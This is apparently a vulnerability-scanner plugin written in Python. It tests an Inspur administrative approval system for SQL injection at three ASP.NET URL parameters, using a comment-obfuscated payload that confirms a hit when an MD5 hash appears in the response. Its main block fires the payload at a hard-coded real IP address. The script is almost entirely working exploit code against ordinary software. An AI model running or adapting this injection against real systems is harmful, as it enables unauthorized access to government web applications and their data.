#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:浪潮行政审批系统四处注入完美绕过（我说我不帅他们说我虚伪）
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0128477
#Author:xq17

def assign(service, arg):
    if service == "lcecgap":
        return True, arg
                
def audit(arg):
    urls = [
    "Bulletin/DocmentDownload.aspx?ID=",
    "LeaderMail/MailDetail.aspx?QueryId=",
    "ViewSource/SrcPrintList.aspx?SerailNO=",
    ]

    data = "%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lcecgap','http://125.75.234.225/xzww/')[1])